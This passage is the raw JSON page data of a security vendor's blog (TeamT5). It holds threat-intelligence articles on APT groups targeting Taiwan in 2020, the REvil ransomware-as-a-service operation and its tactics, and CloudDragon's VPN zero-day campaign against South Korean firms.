against them counts for more than 1/4 in total and almost every APT groups that are active in Taiwan are coveting them. This trend has lasted for long since the ultimate goal of Chinese espionage operation is to obtain confidential national information. Information Technology (IT) industry also got attention a lot by APT actors and TeamT5 has observed a dramatical increase of attacks against IT industry. We believe this phenomenon is a result of threat actors’ attempts to abuse supply chain attacks and IT companies are considered to be good hopping points by actors to access various industries.\n\nThe third industry being targeted in 2020 is Energy industry and TeamT5 had observed at least attacks from 5 adversary groups. It could be a sign of our adversaries’ ambitions to control our critical industries because they will be top priorities of sabotages in wartime. Education or think tanks have been long ranked as the most attacked victims because they tend to involve in classified research projects hosted by governments or political decision makings. There were several targeted attacks against companies in semiconductor industries. It makes sense since Semiconductor industry is listed as a priority to be fostered by Chinese authority in their thirteen and fourteen Five-Year projects. Cyber espionage was also adopted as a mean to improve their techniques. Healthcare and transportation are also two industries that got coveted by APT actors. As we mentioned in the previous paragraph, COVID-19 could be an incentive for APT actors to attack Healthcare industries. Lastly, we would like to raise a phenomenon TeamT5 observed: There was an adversary group which we called GouShe (a.k.a TroppicTropper, Keyboy) focus on infiltrating Transportation related entities in Taiwan. More than 70% of transportation related cases we observed were from this specific group.\n\n![0510-1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620618167/0510_1_bceb3b6be1.png)\n_2020 APT target industries distribution_\n\n<br>\n\nTeamT5 has tracked activities from at least 9 APT groups and 8 of them are from China. HUAPI (a.k.a BlackTech/PLEAD) was definitely the most ambitious group in Taiwan. Their attacks counts around 30% of incidents we analyzed and the targeting scope includes almost all the industries we listed. The supply chain attacks we mentioned in previous paragraphs were also conducted by them. APT27 (a.k.a EmissaryPanda, IronTiger, LuckyMouse, BronzeUnion), GouShe and AMOEBA (a.k.a APT41, Barium, Winnti) are groups that are quite active in 2020. APT27 was mostly attacking government, healthcare, and financial entities. GouShe showed a peculiar interest in transportation related entities while their footprints are also observed in energy and government entities. TeamT5 has tracked this group for many years. Our research shows that the actors might bear some responsibility from their higher commands to monitor some critical infrastructure facilities in Taiwan and take control of them in case of emergency status.\n\nAMOEBA attacked energy companies, semiconductor companies, educational institutes, and IT companies. Their primary goal appears to be more for intellectual property or secret theft. But the possibilities exist that the actor might further leverage their achievement, like what they did in the ransom-attack in May. SLIME1, SLIME9 and SLIME13 are temporary code names for three Chinese APT campaigns against Taiwan that have lasted for a few years. Their activities still continued in 2020. Polaris (a.k.a MustangPanda) is another Chinese APT group that attacked almost all neighboring countries of China. We intercepted several of their spear phishing emails against government and research institutes in early stage of COVID-19 and we surmise they were gathering for information related to pandemic. One last interesting discovery: we discovered some Linux based malware used by Lazarus, a notorious North Korean APT group, circulated in Taiwan but we are unable to obtain the victim identity information. Although Taiwan is not a primary target of North Korean APT. But the Lazarus actors are believed to bear financial supporting responsibilities for their government agencies. For example, Lazarus is believed to be the culprit behind a Taiwanese bank SWIFT heist in 2017 [4]. The sample we uncovered might suggest their activities still exist in Taiwan.\n\n![0510-2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620615927/0510_2_a0a7b82a23.png)\n_Adversaries attacking Taiwan in 2020_\n\n<br>\n\n### Conclusion\n\nThe purpose of this article is to provide a high-level overview of APT threat landscape of Taiwan in 2020, since TeamT5 believes knowing your enemy is the first step of effective defense. TeamT5 research shows that APT attacks keep evolving to become very complex and impossible for a security product to defend. TeamT5 has a cyber threat intelligence (CTI) centered solution, [ThreatVision](https://teamt5.org/en/products/threatvision/), and we rely on a dedicated team of security experts to keep us steps ahead of threat actors. Feel free to contact TeamT5 in case you want to know more about our products, solutions or discuss about threats you are facing.\n\n> Contact us: <sales@teamt5.org>\n\n<br>\n\n### Reference\n\n[1] https://www.ithome.com.tw/news/139331\n\n[2] https://www.slideshare.net/codeblue_jp/cb19-resistance-is-futilethe-undefendable-supplychain-attack-by-sungting-tsai-linda-kuo\n\n[3] https://www.youtube.com/watch?v=1KXb-sf_wos\n\n[4] https://www.reuters.com/article/us-cyber-heist-north-korea-taiwan-idUSKBN1CL2VO\n\n","id":"609899422107530037594a82"}],"createdAt":"2021-05-10T02:24:02.304Z","updatedAt":"2021-06-10T04:40:39.875Z","__v":1,"topic":"5ecaa012a792d70040a0d8b1","author":"5ece27142e1ee4004aa406ef","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1620615558/1_99cbb30acf.png","id":"609899422107530037594a80"},{"publish":true,"enable_form":false,"tags":["6098f2082107530037594ae5","6077eb8c2107530037594a0e","5fd1d9839f8bdc004a7fdf55","60ebe0263f9d29004041a537"],"relative_posts":["60a365f93f9d29004041a487","609899422107530037594a80","60487aacc56e80003f985a39","60c196993f9d29004041a4e1","6077e82e2107530037594a03"],"_id":"6098e8e32107530037594ad3","post_url":"introducing-the-most-profitable-ransomware-revil","post_name":"Introducing The Most Profitable Ransomware REvil","contents":[{"locale":"en","_id":"6098e8e32107530037594ad4","context":"*Image courtesy of [Pixabay](https://pixabay.com/illustrations/security-hacker-web-security-data-5614016/)\n\nIn March 2021, another REvil's attack was announced. Targeting the computer giant Acer, the actors behind the ransomware asked for 50 million dollars, the highest ransom they have demanded so far. Acer was not the only victim of the notorious ransomware. Debuted in April 2019, REvil has attacked hundreds of high-profile agencies in multiple sectors. In 2020, REvil has earned more than 100 million.[1] In this report, we will introduce the basic profile of REvil and share the techniques they used in operations. \n\n\n## What is REvil \n\nREvil, a.k.a Sodinokibi, is a Ransomware as a Service (RaaS) operation deployed by a Russian cybercrime group named GOLD SOUTHFIELD or Pinchy Spider. The group is believed to be based in Russia, as it does not attack organizations in Post-Soviet States, and refuse to cooperate with English speaking cyber criminals.[2] \n\nREvil was highly possible the successor of GandCrab, another notorious ransomware, because of code similarities and REvil's active operations right after GandCrab's retirement.[3]\n\n![REvil_1.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845336/R_Evil_1_035a848033.png)\n_Figure 1: The timeline of REvil's appearance and GandCrab's retirement_\n\n<br>\n\n![REvil_2.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845337/R_Evil_2_804b2676dc.png)\n_Figure 2: REvil and GandCrab's similarity on string decoding_\n\n<br>\n\n![REvil_3.png](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845337/R_Evil_3_e9724a2992.png)\n_Figure 3: REvil and GandCrab's similarity on building ransom wallpaper_\n\n<br>\n\nNumerous campaigns attacking multiple sectors were observed all over the world. The REvil actors has attacked local governments, giant law firms, multinational retailers, etc. The highest ransom they have asked was 42 million for the law firm but was now surpassed by the 50 million Acer attack. (References for the events, please see the end of this page.[4])\n\n<br>\n\n![REvil__4.jpeg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1621845337/R_Evil_4_56bc894487.jpg)\n_Figure 4: The timeline of REvil's notorious attacks_\n\n<br>\n\n## The Ransomware as a Service model (RaaS)\n\nThe actors of REvil adopt the Ransomware as a Service business model. In this model, Ransomware developers are responsible for development and maintenance of the ransomware, while the groups of cyber criminals, named affiliates in this model, are responsible for accessing victims' system to distribute the ransomware. The business model allows cyber criminals who are not capable of developing their own ransomware to buy the service on dark web and deploy ransomware attack. \n \nThrough this model, REvil actors provide REvil or the customized version of REvil to their affiliates. After they successfully breached victims' systems, REvil actors will ask for ransom by themselves, providing the ransom payment link. After the collection of money, their affiliates will receive 60% to 75% of the profit. Moreover, the actors also provide other paid services, such as money laundering assistance for the affiliates. \n\n![May_blog_3.jpeg](https://res.cloudinary.com/dvgomg5gh/image/upload/v1620634812/May_blog_3_71c24e74f2.jpg)\n\n<br>\n\n## Tactic, Techniques and Procedures\n### Initial Access\nFor REvil, different affiliates may use different methods for initial access. The ransomware is now distributed primarily through compromised RDP sessions (65%), phishing (16%), and software vulnerabilities (8%).[5] However, a supply chain attack distributing REvil was also observed.\n\nREvils' actors said in an interview that they used brute force attacks to compromise RDP sessions.[1] As for phishing emails, the cyber criminals have once disguised their email as a new booking from \"booking.com\". They also exploit vulnerabilities. In fact, REvil's debut was exploiting the Oracle Weblogic vulnerability, CVE-2019-2725. Moreover, the actors are able to deploy new vulnerabilities after its disclosure. For example, the group used the recent disclosed Microsoft Exchange server vulnerability to access Acer's system.\n\nThe most astounding technique they deployed is supply chain attack. Around June 2019, a WINRAR distributor site in Italy was hacked.[6][7] The software downloaded from the site at that time was not the WINRAR installer but the REvil installer. Although no public announcements showing that any company was infected in this attack, the successful replacement shows that their affiliates were able to deploy a supply chain attack. \n\nApart from their various method on initial access, the cyber criminals also adopted several unique techniques. For example, REvil used Elliptic-curve Diffie-Hellman key exchange to encrypt files, while other ransomware often used RSA, Salsa20 or AES to do so. This method is more efficient as it used shorter key and is difficult to decrypt. \n\n<br>\n\n## The Effective Methods for Ransom Collection\nNowadays, as ransomware attacks become a serious problem, most companies have learned to back up crucial data in case they are hit by a ransomware. However, ransomware actors develop several new methods to ensure that the victims will pay the ransom, including Double-extortion, VoIP calling, and DDoS attack.\n\n- \"Double-extortion\"\nThe actors disclose or sell the data of the company if the company is not willing to pay ransom. This method was first introduced by Maze, another notorious ransomware, and currently almost all ransomware actors have adopted this method, and so as REvil. Starting from January 2020, the group runs their own site \"Happy Blog\", where they post data extorted from their victims.\n\n- Voice over Internet Protocol (VoIP) calling\nIn February 2021, they announced that they are now offering Voice over Internet Protocol (VoIP) calling and DDoS attack service for their affiliates to make pressure on their victims.[8] They stated that they will call the media or their victims' business partners, telling them about the attack. \n\n<br>\n\n## Detect and Defense\nFor prevention, it is always crucial to be aware of spamming emails. Nowadays, spamming emails is still the most popular and effective method to access victims' computers. \n\nIn addition, keep an eye on new exploits and updates is also important. Ransomware groups usually are not capable of discovering 0-day exploits by themselves, but they will exploit the disclosed vulnerabilities and attack those who have not updated their system. Thus, keep computers updated and patched systems immediately after the disclosure is essential for preventing ransomware attack.\n\nFurthermore, as the REvil business grows, the actors behind has posted on dark web to recruit more affiliates for their operations. Thus, more attacks from the group is expected. TeamT5 will keep following the ransomware and provide up-to-date information of the notorious ransomware.\n\nTo efficiently prevent ransomware attacks, TeamT5 offers a total solution for enterprise protection. Our unique ransomware containment technology is proven to successfully block many types of ransomware, which can detect and stop malicious ransomware immediately. And even restore encrypted files from the backup.\n\nFor more information about TeamT5 Ransomware Prevention total solution, please contact: <sales@teamt5.org>\n\n<br>\n\n## References\n\n[1] https://therecord.media/i-scrounged-through-the-trash-heaps-now-im-a-millionaire-an-interview-with-revils-unknown/\n\n[2] https://www.advanced-intel.com/post/inside-revil-extortionist-machine-predictive-insights\n\n[3] https://www.zdnet.com/article/gandcrab-ransomware-operation-says-its-shutting-down/\n\n[4] Texas Municipalities - https://www.zdnet.com/article/at-least-20-texas-local-governments-hit-in-coordinated-ransomware-attack/; Backup Company - https://www.zdnet.com/article/ransomware-hits-hundreds-of-dentist-offices-in-the-us/; Foreign Exchange Company - https://www.bbc.com/news/business-51017852; US Law Firm - https://www.zdnet.com/article/ransomware-gang-asks-42m-from-ny-law-firm-threatens-to-leak-dirt-on-trump/; Pan-Asia Retailer - https://www.bleepingcomputer.com/news/security/pan-asian-retail-giant-dairy-farm-suffers-revil-ransomware-attack/\n\n[5] https://www.csoonline.com/article/3597298/revil-ransomware-explained-a-widespread-extortion-operation.html\n\n[6] https://www.drcommodore.it/2019/06/20/hackerato-winrar-it-malware-al-posto-del-programma/\n\n[7] https://www.bleepingcomputer.com/news/security/sodinokibi-ransomware-spreads-wide-via-hacked-msps-sites-and-spam/\n\n[8] https://www.bleepingcomputer.com/news/security/ransomware-gang-plans-to-call-victims-business-partners-about-attacks/\n","title":"Introducing The Most Profitable Ransomware REvil","__v":0,"id":"6098e8e32107530037594ad4"}],"createdAt":"2021-05-10T08:03:47.679Z","updatedAt":"2021-07-12T09:26:32.679Z","__v":1,"author":"5eeae9e3163518003f86d917","topic":"5ecaa012a792d70040a0d8b1","publish_date":"2021-06-02T02:30:00.000Z","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1621592937/security_5614016_1920_e059cbe3c6.png","id":"6098e8e32107530037594ad3"},{"publish":true,"enable_form":false,"tags":["609a50942107530037594aff","5ecf88fdfedd7f004b26978c","5eec1270163518003f86d921"],"relative_posts":["60dbea363f9d29004041a50d"],"_id":"60dab1403f9d29004041a4fa","post_url":"clouddragon-campaign-vpn-zero-day-vulnerability-new-backdoor","contents":[{"locale":"en","_id":"60dab3393f9d29004041a4fe","title":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","__v":0,"context":"*Image courtesy of [Pixabay](https://pixabay.com/photos/flag-banner-nation-emblem-country-2528969/)\n\nTeamT5 recently discovered two installers of a newly identified backdoor which we named MemzipRAT. The backdoor is named after an embedded string \"get module from cmd memzip : %d\" inside the PE files.\n\nWith further investigation, we believe this attack was aiming at a South Korean company in the aerospace sector. The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc.\n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities, including Korean government agencies [1], recently. It is highly possible that they deployed their new malware by the new vulnerability in this case as well. \n\n<br>\n\nYet, there are two key factors that might pull the trigger of massive intrusions:\n\n1. VPN vulnerability\n\n The VPN market in 2020 is USD $30 billion worldwide. That is, the market is huge and has multiple players inside. It could be a starting point for actors to infiltrate various corporations not only in South Korea, but to the whole world.\n \n2. Sectors involved\n\n As the identified target involved in crucial sectors, such as IT, it has a great chance to affect hundreds of entities in a short period.\n\n<br>\n\nWe strongly advise everyone to take careful attention to CloudDragon's recent campaign for it might end up a severe supply chain attack.\n\n## Reference\n\n[1] https://biz.chosun.com/policy/politics/2021/06/18/V4DTFCEXPRA4DFCBVVJO3DPR5I/\n\n<br>\n\n<br>","id":"60dab3393f9d29004041a4fe"}],"createdAt":"2021-06-29T05:36:00.041Z","updatedAt":"2021-07-01T03:16:55.564Z","__v":0,"author":"5eeae9e3163518003f86d917","topic":"5ecaa012a792d70040a0d8b1","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1624944845/flag_2528969_1920_10918af673.jpg","publish_date":"2021-06-30T10:00:00.000Z","post_name":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","id":"60dab1403f9d29004041a4fa"}],"id":"5ecaa012a792d70040a0d8b1"},"banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1624944845/flag_2528969_1920_10918af673.jpg","publish_date":"2021-06-30T10:00:00.000Z","post_name":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","id":"60dab1403f9d29004041a4fa"}],"_id":"60dbea363f9d29004041a50d","post_name":"Another CloudDragon attack abusing VPN zero-day vulnerability to target South Korean entities","post_url":"another-clouddragon-attack-abusing-vpn-zero-day-vulnerability-to-target-south-korean-entities","publish_date":"2021-07-01T02:00:00.000Z","contents":[{"locale":"en","_id":"60dbea363f9d29004041a50e","context":"*Image courtesy of [Pixabay](https://pixabay.com/illustrations/north-korea-dprk-korea-juche-asia-1151137/)\n\nThe North Korean APT group CloudDragon, also known as Kimsuky, continues to target South Korean governments and organizations. TeamT5 has been actively monitoring this threat actor and we recently discovered CloudDragon abusing VPN zero-day vulnerability to launch a new attack against South Korean entities.\n\nTeamT5 recently discovered two malicious samples circulating in South Korea, and both samples are installers of a newly identified backdoor which we named MemzipRAT. With further investigation, we believe this attack was aiming at a South Korean company in the aerospace sector. The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc. \n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities recently, including Korean government agencies. According to TeamT5’s threat intelligence, we hold high confidence that the above malware to be follow-up attacks of the disclosed attack campaign conducted by CloudDragon. As the exploitation starts from a popular VPN system, these campaigns might lead to massive attacks and damage in the near future. And TeamT5 will keep taking careful attention to CloudDragon's recent campaign for it might end up a severe supply chain attack.\n\n<br>\n","title":"Another CloudDragon attack abusing VPN zero-day vulnerability to target South Korean entities","__v":0,"id":"60dbea363f9d29004041a50e"},{"locale":"tw","_id":"60dbeb6c3f9d29004041a510","title":"北韓駭客組織再次利用 VPN 零時差漏洞對南韓航太產業發動攻擊","context":"圖片來源：[Pixabay](https://pixabay.com/illustrations/north-korea-dprk-korea-juche-asia-1151137/)\n\n北韓 APT 攻擊族群 CloudDragon（又名為 Kimsuky）持續針對南韓政府與組織發動攻擊。 TeamT5 長期持續關注此駭客族群，發現 CloudDragon 近期利用 VPN 零時差漏洞（zero-day vulnerability）對南韓發動另一波新的攻擊。\n\n根據 TeamT5 近期研究，我們發現了兩個攻擊南韓的惡意程式樣本，與我們最新發現的後門程式 MemzipRAT 有高度關聯，皆為其安裝程式。我們推測這一波攻擊是針對南韓某航太產業公司而來，該受駭公司為南韓前十大企業之一，業務範圍涵蓋航太、化學、金融、IT 服務等。攻擊者利用一尚未揭露的  VPN 伺服器漏洞，駭進目標環境並部署惡意程式。\n\n最近多起針對韓國的攻擊，包括南韓政府研究單位受駭，也疑似為 CloudDragon 透過 VPN 服務漏洞展開的入侵行動。根據 TeamT5 掌握的相關情資，我們有高度信心認為，這次攻擊使用的新後門程式為 CloudDragon VPN 攻擊的後續利用。我們推測，攻擊者將持續利用此知名 VPN 系統漏洞，發動更大型、損害更嚴重的攻擊，未來也不排除轉變為供應鏈攻擊的可能。\n\n<br>\n","__v":0,"id":"60dbeb6c3f9d29004041a510"}],"createdAt":"2021-06-30T03:51:18.736Z","updatedAt":"2021-07-01T03:16:55.562Z","__v":1,"author":{"confirmed":true,"blocked":false,"_id":"5eec3483163518003f86d943","username":"TeamT5 Media Center","email":"mediacenter@example.com","provider":"local","createdAt":"2020-06-19T03:44:03.552Z","updatedAt":"2020-06-20T03:45:49.078Z","__v":0,"role":"5e467d0375f9d7007998aebf","id":"5eec3483163518003f86d943"},"topic":{"category":"news_and_events","_id":"5ecaa036a792d70040a0d8b4","name":"News","color":"#908883","createdAt":"2020-05-24T16:26:30.992Z","updatedAt":"2020-06-07T22:10:25.925Z","__v":0,"contents":[{"locale":"en","_id":"5edd65d1bf58af004a154125","text":"News","createdAt":"2020-06-07T22:10:25.895Z","updatedAt":"2020-06-07T22:10:25.895Z","__v":0,"id":"5edd65d1bf58af004a154125"},{"locale":"tw","_id":"5edd65d1bf58af004a154126","text":"新聞","createdAt":"2020-06-07T22:10:25.895Z","updatedAt":"2020-06-07T22:10:25.895Z","__v":0,"id":"5edd65d1bf58af004a154126"},{"locale":"jp","_id":"5edd65d1bf58af004a154127","text":"ニュース","createdAt":"2020-06-07T22:10:25.895Z","updatedAt":"2020-06-07T22:10:25.895Z","__v":0,"id":"5edd65d1bf58af004a154127"}],"id":"5ecaa036a792d70040a0d8b4"},"banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1624944845/north_korea_1151137_1920_0727509c9b.jpg","been_relative_posts":[{"publish":true,"enable_form":false,"tags":["609a50942107530037594aff","5ecf88fdfedd7f004b26978c","5eec1270163518003f86d921"],"relative_posts":["60dbea363f9d29004041a50d"],"_id":"60dab1403f9d29004041a4fa","post_url":"clouddragon-campaign-vpn-zero-day-vulnerability-new-backdoor","contents":[{"locale":"en","_id":"60dab3393f9d29004041a4fe","title":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","__v":0,"context":"*Image courtesy of [Pixabay](https://pixabay.com/photos/flag-banner-nation-emblem-country-2528969/)\n\nTeamT5 recently discovered two installers of a newly identified backdoor which we named MemzipRAT. The backdoor is named after an embedded string \"get module from cmd memzip : %d\" inside the PE files.\n\nWith further investigation, we believe this attack was aiming at a South Korean company in the aerospace sector. The company is part of a top 10 conglomerate in South Korea, whose business includes aerospace, chemicals, financial services, IT, etc.\n\nIn fact, CloudDragon has been accused of using VPN vulnerabilities to attack numerous entities, including Korean government agencies [1], recently. It is highly possible that they deployed their new malware by the new vulnerability in this case as well. \n\n<br>\n\nYet, there are two key factors that might pull the trigger of massive intrusions:\n\n1. VPN vulnerability\n\n The VPN market in 2020 is USD $30 billion worldwide. That is, the market is huge and has multiple players inside. It could be a starting point for actors to infiltrate various corporations not only in South Korea, but to the whole world.\n \n2. Sectors involved\n\n As the identified target involved in crucial sectors, such as IT, it has a great chance to affect hundreds of entities in a short period.\n\n<br>\n\nWe strongly advise everyone to take careful attention to CloudDragon's recent campaign for it might end up a severe supply chain attack.\n\n## Reference\n\n[1] https://biz.chosun.com/policy/politics/2021/06/18/V4DTFCEXPRA4DFCBVVJO3DPR5I/\n\n<br>\n\n<br>","id":"60dab3393f9d29004041a4fe"}],"createdAt":"2021-06-29T05:36:00.041Z","updatedAt":"2021-07-01T03:16:55.564Z","__v":0,"author":"5eeae9e3163518003f86d917","topic":"5ecaa012a792d70040a0d8b1","banner_img_url":"https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/v1624944845/flag_2528969_1920_10918af673.jpg","publish_date":"2021-06-30T10:00:00.000Z","post_name":"CloudDragon's Campaign: VPN Zero-day Vulnerability + New Backdoor","id":"60dab1403f9d29004041a4fa"}],"id":"60dbea363f9d29004041a50d"}},"__N_SSG":true}